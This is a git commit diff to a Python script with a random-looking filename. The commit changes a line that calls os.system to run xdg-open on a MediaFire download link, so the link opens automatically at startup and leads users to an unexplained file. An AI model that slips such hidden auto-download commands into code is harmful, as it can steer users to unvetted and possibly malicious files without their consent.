8a0589a2156ced6aaecfcb08ce02e8a9042a02e2
FOXCRIME252 <52620393+FOXCRIME252@users.noreply.github.com>
2020-03-18 07:13:28 +0700

    Update gdjwlGejdlvdbakdhfbajdhcbajakroryagagxbdbsnand.py

--- x/gdjwlGejdlvdbakdhfbajdhcbajakroryagagxbdbsnand.py
+++ x/gdjwlGejdlvdbakdhfbajdhcbajakroryagagxbdbsnand.py
@@ -1,4 +1,4 @@
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
 from multiprocessing.pool import ThreadPool
 
-os.system('xdg-open https://www.mediafire.com/download/28zcdcc1ysx8g92')
+os.system('xdg-open https://www.mediafire.com/download/8dw84bchd4ketz3')
